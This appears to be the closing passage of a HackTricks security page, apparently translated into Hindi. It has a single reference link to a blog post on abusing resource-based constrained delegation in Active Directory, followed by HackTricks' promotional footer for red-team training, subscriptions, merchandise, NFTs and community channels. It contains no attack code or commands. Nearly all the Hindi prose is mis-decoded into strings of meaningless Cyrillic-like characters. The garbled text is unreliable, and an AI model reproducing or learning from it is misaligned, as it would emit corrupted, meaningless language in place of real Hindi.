* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**ред
* **HackTricks** рдХреЛ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░рдХреЗ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
